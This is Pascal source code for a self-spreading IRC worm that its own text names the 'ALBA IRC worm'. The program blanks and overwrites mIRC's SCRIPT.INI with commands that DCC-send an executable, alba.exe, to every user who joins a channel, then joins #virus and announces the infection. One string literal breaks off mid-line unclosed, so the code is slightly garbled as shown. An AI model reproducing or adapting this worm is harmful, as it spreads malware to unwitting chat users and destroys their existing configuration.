const scriptini = ('[script]'+Char($D)+Char($A)+
'n0=on 1:JOIN:#: if ( $me != $nick )'
'{ /dcc send $nick c:\mirc\download\alba.exe }'+Char($D)+Char($A)+
'n1=on 1:CONNECT: {'+Char($D)+Char($A)+
'n2=  /join #virus'+Char($D)+Char($A)+
'n3=  /msg #virus Hello, I have been infected with the ALBA IRC worm written in 
'n4=}');
var f : text;

begin
 assign(f,'C:\MIRC\SCRIPT.INI'); { SCRIPT.INI is the file we want! }
 rewrite(f);		     { Blank the file		  }
 write(f,scriptini);	     { Write our code to SCRIPT.INI    }
 close(f);		       { Close file & save changes       }
 Halt;			   { It's time for a sharp exit ;)   }
end.
